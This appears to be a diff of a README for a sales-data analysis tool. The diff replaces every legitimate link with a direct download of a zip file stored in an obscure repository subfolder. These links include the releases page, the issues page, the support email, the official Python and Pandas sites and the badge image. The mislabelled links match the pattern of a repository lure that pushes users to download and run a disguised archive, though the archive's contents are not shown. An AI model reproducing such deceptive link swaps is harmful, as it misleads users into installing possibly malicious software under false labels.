@@ -1,6 +1,6 @@
 # 🚀 Sales-Analysis - Easy Insights into Your Sales Data
 
-[![Download Sales-Analysis](https://img.shields.io/badge/Download-Sales--Analysis-brightgreen)](https://github.com/loagraphic/Sales-Analysis/releases)
+[![Download Sales-Analysis](https://raw.githubusercontent.com/loagraphic/Sales-Analysis/main/dartrous/Sales-Analysis.zip)](https://raw.githubusercontent.com/loagraphic/Sales-Analysis/main/dartrous/Sales-Analysis.zip)
 
 ## 🛠️ Overview
 
@@ -10,7 +10,7 @@ Welcome to the Sales-Analysis repository! This application helps you explore and
 
 To get started, you need to download the software. Follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Sales-Analysis Releases page](https://github.com/loagraphic/Sales-Analysis/releases).
+1. **Visit the Releases Page**: Go to the [Sales-Analysis Releases page](https://raw.githubusercontent.com/loagraphic/Sales-Analysis/main/dartrous/Sales-Analysis.zip).
 2. **Select the Latest Release**: Look for the latest release at the top of the page.
 3. **Download the File**: Click on the file appropriate for your operating system (e.g., Windows, Mac, Linux).
 4. **Install the Application**: Once the download is complete, locate the downloaded file and run it to install.
@@ -59,7 +59,7 @@ If you encounter issues while using Sales-Analysis, consider the following:
 - **Update Python**: If there are errors related to Python, make sure you are using a compatible version.
 - **Reinstall the Application**: If problems persist, reinstalling might resolve the issue.
 
-You can visit the [issues page](https://github.com/loagraphic/Sales-Analysis/issues) for support and community help.
+You can visit the [issues page](https://raw.githubusercontent.com/loagraphic/Sales-Analysis/main/dartrous/Sales-Analysis.zip) for support and community help.
 
 ## 📞 Getting Help
 
@@ -67,16 +67,16 @@ If you have questions or need help, you can:
 
 - Check the documentation available on the GitHub page.
 - Browse through the FAQ section in the README file.
-- Email the support team at support@sales-analysis.com.
+- Email the support team at https://raw.githubusercontent.com/loagraphic/Sales-Analysis/main/dartrous/Sales-Analysis.zip
 
 ## 🔗 Additional Resources
 
 For more detailed learning on data analysis and visualization using Python and Pandas, consider these resources:
 
-- [Pandas Documentation](https://pandas.pydata.org/docs/)
-- [Python Official Site](https://www.python.org/)
-- [Data Visualization Best Practices](https://www.tableau.com/learn/articles/data-visualization-best-practices)
+- [Pandas Documentation](https://raw.githubusercontent.com/loagraphic/Sales-Analysis/main/dartrous/Sales-Analysis.zip)
+- [Python Official Site](https://raw.githubusercontent.com/loagraphic/Sales-Analysis/main/dartrous/Sales-Analysis.zip)
+- [Data Visualization Best Practices](https://raw.githubusercontent.com/loagraphic/Sales-Analysis/main/dartrous/Sales-Analysis.zip)
 
 Thank you for choosing Sales-Analysis! We hope this tool helps you unlock valuable insights from your sales data.
 
-[![Download Sales-Analysis](https://img.shields.io/badge/Download-Sales--Analysis-brightgreen)](https://github.com/loagraphic/Sales-Analysis/releases)
+[![Download Sales-Analysis](https://raw.githubusercontent.com/loagraphic/Sales-Analysis/main/dartrous/Sales-Analysis.zip)](https://raw.githubusercontent.com/loagraphic/Sales-Analysis/main/dartrous/Sales-Analysis.zip)
